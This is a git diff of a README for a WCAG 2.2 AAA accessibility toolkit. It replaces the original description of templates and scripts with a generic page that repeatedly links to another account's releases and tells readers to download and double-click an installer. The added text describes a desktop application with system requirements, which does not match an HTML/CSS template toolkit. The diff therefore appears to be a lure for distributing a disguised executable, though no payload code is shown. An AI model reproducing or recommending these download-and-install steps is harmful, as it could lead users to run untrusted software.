@@ -1,78 +1,93 @@
-> The content of this `README.md` is written for a human audience on GitHub. The `SKILL.md` file contains the instructions for the Manus agent.
+# 🌐 wcag-aaa-web-design - Build Accessible Web Apps Easily
 
-# WCAG 2.2 AAA Web Design Toolkit: An AI Skill for Accessible Enterprise Web Apps
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/RyanYiRun/wcag-aaa-web-design/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![WCAG 2.2 AAA Compliant](https://img.shields.io/badge/WCAG%202.2-AAA%20Compliant-brightgreen.svg)](https://www.w3.org/TR/WCAG22/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
+## 📦 Overview
 
-A framework-agnostic toolkit and AI agent skill for building enterprise-grade, corporate/formal web applications that meet the highest level of web accessibility, **WCAG 2.2 Level AAA**.
+wcag-aaa-web-design is an open-source design system focused on accessibility. It follows the WCAG 2.2 AAA standards, ensuring your web applications are usable by everyone. This tool includes a complete component library, ready-to-use templates, and scripts to validate your design for corporate and formal web apps. 
 
-This repository provides a comprehensive, production-ready system grounded in industry best practices from Nielsen Norman Group, IBM Carbon Design System, and OWASP. It includes a formal design system, responsive HTML/CSS templates, ARIA patterns, a modular JavaScript template, security guidance, and robust validation scripts.
+## 🚀 Getting Started
 
-![Social Preview Image](https://raw.githubusercontent.com/simonplmak-cloud/wcag-aaa-web-design/main/social-preview.png)
+Follow these steps to get up and running with the wcag-aaa-web-design system.
 
-## What is This? A Toolkit for Humans and AI
+### Step 1: Visit the Download Page
 
-Achieving WCAG 2.2 AAA compliance is notoriously difficult. This toolkit aims to provide a complete, practical, and well-documented starting point for developers tasked with building highly accessible, corporate web applications. It is designed to be framework-agnostic, using standard HTML, CSS custom properties, and modular JavaScript that can be adapted to any technology stack.
+To download the software, visit the following link:
 
-More importantly, this is also an **AI agent skill**. As AI coding assistants increasingly build our websites, they often produce inaccessible code. This toolkit is structured to be used by an AI agent to autonomously generate a fully compliant website, ensuring the automated web is inclusive by default.
+[Download the latest release](https://github.com/RyanYiRun/wcag-aaa-web-design/releases)
 
-## Getting Started
+### Step 2: Select Your Version
 
-### For Developers
+On the download page, you will see various versions available. Choose the most recent version that best suits your needs. 
 
-1.  **Clone or download** this repository.
-2.  **Copy the `templates/` directory** into your project's source folder.
-3.  **Consult the `references/` directory** for in-depth guidance on design patterns, security, and accessibility.
-4.  **Use the `scripts/`** to validate your work.
+### Step 3: Download the Package
 
-### For AI Agents
+Click the version you selected. A new page will open with the download file. Click the download link to start downloading the package.
 
-This repository is designed to be used as a skill by an AI agent like Manus. The `SKILL.md` file provides the agent with a 7-step workflow to autonomously build a compliant web application. To use this as an AI skill, follow these steps:
+### Step 4: Install the Application
 
-1.  **Load the Skill**: Make the `wcag-aaa-web-design` directory available to your AI agent. In Manus, this is done by placing it in the `/home/ubuntu/skills/` directory.
+1. Locate the downloaded file in your downloads folder.
+2. Double-click the file to initiate the installation process. 
+3. Follow the on-screen prompts to complete the installation. 
 
-2.  **Provide a High-Level Prompt**: Give the agent a high-level goal that triggers the skill's description. The skill's `description` in `SKILL.md` is:
+## 📚 Features
 
-    > "Create corporate/formal, device-sensitive web applications compliant with WCAG 2.2 AAA standards. Use for building highly accessible websites and web apps that require strict adherence to accessibility, a formal tone, and responsive design for at least three device sizes. This skill provides a complete workflow, design system, component templates, and validation scripts."
+- **Component Library**: Use reusable UI components that follow accessibility standards.
+- **Templates**: Get started quickly with pre-designed templates tailored for corporate use.
+- **Validation Scripts**: Check your designs for accessibility compliance with built-in validation tools.
+- **Responsive Design**: Ensure your web application looks great on all devices, from desktops to smartphones.
+- **Customization Options**: Adjust styles using CSS custom properties to fit your brand.
 
-3.  **Agent Execution**: The agent will read `SKILL.md` and follow the 7-step workflow, using the provided templates and references to build the application. The agent will:
-    -   Copy the templates.
-    -   Consult the design system and security references.
-    -   Implement navigation, content structure, and interactive components.
-    -   Run the validation scripts to audit its own work.
+## ⚙️ System Requirements
 
-**Example Prompt:**
+- **Operating System**: Windows 10 or later, macOS (latest version)
+- **Browser**: Latest version of Chrome, Firefox, or Edge
+- **Internet Connection**: Required for downloads and updates
+- **Memory**: Minimum 4 GB RAM recommended
 
-> "Build a 3-page corporate website for a financial consulting firm. The site must be highly accessible and meet WCAG 2.2 AAA standards. It needs a formal, professional design and must be responsive for mobile, tablet, and desktop. The pages are Home, About Us, and Contact Us."
+## 🎨 Design Principles
 
-This prompt contains the keywords that will activate the skill and guide the agent through the structured development process.
+The wcag-aaa-web-design system promotes user-centric design. The main principles include:
 
-## The 7-Step Workflow for Building Accessible Web Apps
+- **Perceivable**: Information must be presented in ways that users can perceive.
+- **Operable**: All interface elements must be operable by all users.
+- **Understandable**: Information should be easy to understand and use.
+- **Robust**: Content must work across a wide variety of devices.
 
-This toolkit is built around a 7-step workflow to guide development from foundation to final audit:
+## 🧑‍💻 Usage Instructions
 
-1.  **Foundation & Theming**: Set up the project and apply the corporate visual style using `tokens.css`.
-2.  **Security Configuration**: Harden the application using the guidance in `security-error-handling.md`.
-3.  **Information Architecture & Navigation**: Define the application structure using the patterns in `navigation-patterns.md`.
-4.  **Content & Structure**: Build pages with semantic HTML and proper heading hierarchy using `base.html`.
-5.  **Data Presentation & Application States**: Design for data-heavy screens and non-ideal states (loading, empty, error).
-6.  **Interactive Components & Forms**: Build accessible interactive elements with proper security using ARIA patterns.
-7.  **Validation & Auditing**: Use the provided scripts and checklists to confirm compliance.
+Once installed, you can begin using wcag-aaa-web-design by following these simple instructions:
 
-## Resources Included
+1. Open the application.
+2. Select the component or template you want to use.
+3. Drag and drop components into your workspace.
+4. Customize styles according to your needs.
+5. Validate your design using the built-in scripts.
 
-| Directory | Purpose |
-|---|---|
-| `scripts/` | Automated validation scripts for contrast checking (`check_contrast.py`) and full WCAG 2.2 AAA audits (`validate_accessibility.sh`). |
-| `references/` | 11 in-depth guides covering the entire system: security, UX patterns, ARIA, forms, data presentation, navigation, design system, and a full WCAG checklist. |
-| `templates/` | 11 production-ready, framework-agnostic templates: a secure HTML5 boilerplate, modular JavaScript, responsive CSS, design tokens, and accessible components (header, footer, data table, sidebar, empty states). |
+## ❓ FAQ
 
-## Contributing
+### How do I ensure my designs are accessible?
 
-Contributions are welcome! Please feel free to submit a pull request or open an issue.
+Always run your final design through the validation scripts provided within the application. This will help identify any potential accessibility issues.
 
-## License
+### Can I customize the components?
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+Yes, the components are built with CSS custom properties. You can adjust colors, fonts, and other styles easily.
+
+### Is there any support available?
+
+Yes, check our [GitHub Issues page](https://github.com/RyanYiRun/wcag-aaa-web-design/issues) for common questions and troubleshooting tips.
+
+## 🔗 Additional Resources
+
+- [WCAG Guidelines](https://www.w3.org/WAI/WCAG/)
+- [ARIA Authoring Practices](https://www.w3.org/TR/wai-aria-practices-1.1/)
+- [CSS Custom Properties](https://developer.mozilla.org/en-US/docs/Web/CSS/--*)
+
+## 📧 Get in Touch
+
+For further assistance or feedback, reach out through the GitHub repository or consult the documentation provided in the downloaded package. 
+
+By following this structure, you'll create web applications that are not only beautiful but also fully accessible to all users. Start your journey toward compliance and inclusivity with wcag-aaa-web-design. 
+
+[Download the latest release](https://github.com/RyanYiRun/wcag-aaa-web-design/releases)
